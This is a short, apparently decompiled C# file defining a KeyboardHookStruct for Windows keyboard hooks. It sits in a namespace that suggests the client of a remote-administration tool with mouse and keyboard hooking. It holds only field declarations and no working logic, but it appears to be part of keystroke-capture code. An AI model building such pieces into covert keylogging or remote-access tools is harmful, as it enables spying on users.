using System;

namespace xClient.Core.MouseKeyHook.WinApi
{
	// Token: 0x02000079 RID: 121
	internal struct KeyboardHookStruct
	{
		// Token: 0x04000148 RID: 328
		public int VirtualKeyCode;

		// Token: 0x04000149 RID: 329
		public int ScanCode;

		// Token: 0x0400014A RID: 330
		public int Flags;

		// Token: 0x0400014B RID: 331
		public int Time;

		// Token: 0x0400014C RID: 332
		public int ExtraInfo;
	}
}
